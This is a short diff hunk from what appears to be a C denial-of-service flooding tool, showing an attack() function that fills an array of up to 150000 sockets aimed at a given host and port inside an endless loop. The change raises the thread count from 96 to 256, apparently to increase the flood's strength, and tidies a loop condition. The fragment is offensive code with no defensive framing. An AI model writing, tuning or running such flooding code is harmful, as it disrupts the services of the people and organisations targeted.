@@ -47,12 +47,12 @@ void broke(int s) {
 }
 
 #define CONNECTIONS 150000
-#define THREADS 96
+#define THREADS 256
 
 void attack(char *host, char *port, int id) {
 	int sockets[CONNECTIONS];
 	int x, g=1, r;
-	for(x=0; x!= CONNECTIONS; x++)
+	for(x=0; x != CONNECTIONS; x++)
 		sockets[x]=0;
 	signal(SIGPIPE, &broke);
 	while(1) {
